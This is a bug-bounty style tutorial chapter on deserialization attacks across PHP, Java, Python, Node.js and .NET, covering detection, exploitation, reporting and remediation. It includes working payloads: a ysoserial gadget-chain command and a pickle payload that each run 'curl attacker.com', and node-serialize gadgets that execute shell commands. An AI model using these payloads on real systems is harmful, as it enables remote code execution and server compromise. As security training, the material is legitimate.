# Chapter 28 – Deserialization Attacks (PHP, Java, Python, Node.js, .NET)

## Mental Model
Deserialization attacks occur when an application:
1. Accepts **untrusted user input**, and  
2. Passes it into a **deserialization function**, and  
3. Loads attacker-controlled data into server memory as objects.

If the app loads dangerous object types, attacker gains:
- Remote Code Execution (RCE)
- Authentication bypass
- Arbitrary file read/write
- Logic manipulation
- Full server compromise

This bug class has produced **massive bounties ($10k–$40k)**.

---

# Core Concepts

## Serialization
Transforms an object → string/byte stream.

## Deserialization
Transforms the string → object again.

If attacker controls input, they control the object.

---

# High-Risk Languages & Frameworks

## 1. **PHP (extremely vulnerable)**
Dangerous functions:
- `unserialize()`
- `msgpack_unserialize()`
- `yaml_parse()`

PHP object injection allows:
- File deletion
- File write
- Database corruption
- Code execution via magic methods (`__wakeup`, `__destruct`, `__toString`)

**Payload example:**
```php
O:8:"UserData":1:{s:8:"isAdmin";b:1;}
2. Java (the original RCE factory)

Java deserialization vulnerabilities often lead to instant RCE.

Dangerous APIs:

ObjectInputStream

readObject()

RMI

Apache Commons Collections

WebLogic / WebSphere / JBoss

Attackers build “gadget chains” using ysoserial:

java -jar ysoserial.jar CommonsCollections6 "curl attacker.com" | base64

3. Python

Dangerous functions:

pickle.loads

pickle.load

yaml.load (unsafe)

marshal.loads

Pickle can execute arbitrary code:

import pickle
pickle.loads(b"cos\nsystem\n(S'curl attacker.com'\ntR.")

4. Node.js

Dangerous parsing libraries:

node-serialize

serialize-javascript

qs (prototype pollution → RCE chain)

express-session (if cookie secret weak)

Example gadget:

{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id'); }()"}

5. .NET

Weaknesses:

BinaryFormatter

LosFormatter

ViewState (if MAC disabled = RCE)

Example ViewState exploitation earns high bounties:

CVE-2017-11317

CVE-2020-XXXX variants still exist privately

How to Identify Deserialization Bugs
Step 1 — Look for serialized data patterns

Common indicators:

PHP
O:6:"Config":2:{s:3:"env";s:3:"dev";}

Java base64 blob
rO0ABXNyAC9qYXZhLnV0aWwuQXJyYXk=

Pickle
cos
system
(S'id'
tR.

Node.js
{"_$$ND_FUNC$$_":"function() { ... }"}

.NET ViewState
/wEPDwUKLTExMTIyMzM0NQ9kFgICAQ9kFgQCAQ8PFgIeBFRleHQFCUhlbGxvIFdvcmxkZA==

Step 2 — Search in:

Cookies

Hidden form fields

API request bodies

File formats (PDF, XML, YAML, JSON, MsgPack, AMF)

Session tokens

Mobile API packets

WebSockets

Step 3 — Try tampering

Examples:

Change boolean values

Inject objects

Add unexpected fields

Replace values with payloads

If app crashes → high-value lead.

Practical Attacks
1. PHP Object Injection → File Delete

Change object field to point to /var/www/html/config.php.

2. Java RCE via ysoserial

If vulnerable:

java -jar ysoserial.jar CommonsCollections1 "id" | base64


Send payload → RCE.

3. Python Pickle RCE

If API accepts pickled objects:
Attacker sends malicious pickle → server executes arbitrary commands.

4. Node.js RCE

If node-serialize used:
Attacker adds:

"_$$ND_FUNC$$_": "function(){require('child_process').exec('curl attacker')}"

5. .NET ViewState RCE

If MAC disabled:
Attacker forges ViewState → RCE.

High-Value Targets

Look at:

Export/import features

“Load configuration” endpoints

Online editors

File converters

Messaging formats

Dashboard widgets

Admin tools

Shopping cart save/load

Session state storage

Background job processors

Anywhere objects move between client ↔ server can be vulnerable.

Automation Ideas

Fingerprint serialized data in Burp using matches & highlights

Use ysoserial to generate Java payloads

Use PHPGGC for PHP gadget chains

Write a Python pickle payload generator

Bruteforce ViewState MAC keys

Reporting Tips

Include:

Serialized payload before and after

Full request/response

Impact (account takeover, RCE, data theft)

Gadget chain details

Steps to reproduce

How attacker can abuse it consistently

Remediation

Never deserialize untrusted input

Use safe alternatives (JSON, protobuf)

Enforce strict input validation

Implement signing and integrity checks

Keep libraries patched

Block dangerous object types

Use allowlists for classes
